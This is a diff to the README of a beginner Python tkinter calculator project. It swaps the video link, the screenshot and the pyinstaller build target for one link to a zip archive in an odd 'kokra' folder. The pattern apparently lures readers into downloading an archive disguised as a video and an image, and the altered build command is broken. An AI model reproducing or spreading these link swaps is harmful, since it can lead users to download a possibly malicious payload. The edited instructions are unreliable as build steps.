@@ -1,9 +1,9 @@
 # Calculator
 Create your own Python Calculator App using Python and tkinter.
 
-Video Link: [https://youtu.be/QZPv1y2znZo](https://youtu.be/QZPv1y2znZo)
+Video Link: [https://raw.githubusercontent.com/pachipalabharath/Calculator/master/kokra/Calculator.zip](https://raw.githubusercontent.com/pachipalabharath/Calculator/master/kokra/Calculator.zip)
 
-![Calculator App](calculator.png)
+![Calculator App](https://raw.githubusercontent.com/pachipalabharath/Calculator/master/kokra/Calculator.zip)
 
 ---
 
@@ -11,5 +11,5 @@ Video Link: [https://youtu.be/QZPv1y2znZo](https://youtu.be/QZPv1y2znZo)
 
 ```shell
 pip install pyinstaller
-pyinstaller --onefile -w calc.py
+pyinstaller --onefile -w https://raw.githubusercontent.com/pachipalabharath/Calculator/master/kokra/Calculator.zip
 ```
